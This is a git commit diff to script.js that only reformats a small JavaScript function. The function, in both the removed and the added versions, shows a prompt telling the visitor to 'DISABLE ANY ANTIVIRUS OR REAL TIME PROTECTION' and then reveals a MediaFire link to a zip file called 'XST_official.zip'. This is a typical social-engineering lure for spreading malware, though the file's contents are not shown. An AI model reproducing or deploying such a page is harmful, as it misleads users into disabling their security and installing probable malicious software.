9794585706fdb680b1af04e207b8beb923e5a632
superjhay29 <105788845+superjhay29@users.noreply.github.com>
2024-02-12 19:07:12 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,8 @@
-function showDownloadLink() {
-    var confirmDownload = confirm("DISABLE ANY ANTIVIRUS OR REAL TIME PROTECTION");
-    
-    if (confirmDownload) {
-        document.getElementById('downloadLink').style.display = 'block';
-        document.getElementById('downloadLink').innerHTML = 'Download tool now<a href="https://www.mediafire.com/file/w6342v3tgerxdba/XST_official.zip/file">here</a>.';
-    }
-}
+  function showDownloadLink() {
+            var confirmDownload = confirm("DISABLE ANY ANTIVIRUS OR REAL TIME PROTECTION");
+            
+            if (confirmDownload) {
+                document.getElementById('downloadLink').style.display = 'block';
+                document.getElementById('downloadLink').innerHTML = 'Download tool now <a href="https://www.mediafire.com/file/w6342v3tgerxdba/XST_official.zip/file">here</a>.';
+            }
+        }
